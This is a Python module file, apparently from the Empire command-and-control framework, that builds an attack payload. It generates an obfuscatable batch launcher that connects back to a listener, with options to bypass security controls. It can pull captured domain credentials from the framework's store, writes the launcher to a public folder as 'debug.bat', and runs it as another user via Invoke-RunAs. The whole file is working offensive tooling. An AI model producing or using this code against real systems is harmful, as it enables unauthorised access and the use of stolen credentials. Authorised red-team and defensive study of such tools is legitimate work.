from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            raise ModuleValidationException(err)

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            with SessionLocal() as db:
                cred = main_menu.credentialsv2.get_by_id(db, cred_id)

                if not cred:
                    raise ModuleValidationException("CredID is invalid")

                if cred.domain != "":
                    params["Domain"] = cred.domain
                if cred.username != "":
                    params["UserName"] = cred.username
                if cred.password != "":
                    params["Password"] = cred.password

        # extract all of our options

        launcher = main_menu.stagertemplatesv2.new_instance("windows_launcher_bat")
        launcher.options["Listener"]["Value"] = params["Listener"]
        launcher.options["Delete"]["Value"] = "True"
        launcher.options["Language"]["Value"] = params["Language"]
        if (params["Obfuscate"]).lower() == "true":
            launcher.options["Obfuscate"]["Value"] = "True"
            launcher.options["ObfuscateCommand"]["Value"] = params["ObfuscateCommand"]
        else:
            launcher.options["Obfuscate"]["Value"] = "False"
        launcher.options["Bypasses"]["Value"] = params["Bypasses"]
        launcher_code = launcher.generate()

        # PowerShell code to write the launcher.bat out
        script_end = r'$tempLoc = "$env:public\debug.bat"'
        script_end += '\n$batCode = @"\n' + launcher_code + '\n"@\n'
        script_end += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
        script_end += '"Launcher bat written to $tempLoc `n";\n'

        script_end += "\nInvoke-RunAs "
        script_end += "-UserName {} ".format(params["UserName"])
        script_end += "-Password '{}' ".format(params["Password"])

        domain = params["Domain"]
        if domain and domain != "":
            script_end += f"-Domain {domain} "

        script_end += r'-Cmd "$env:public\debug.bat"'

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
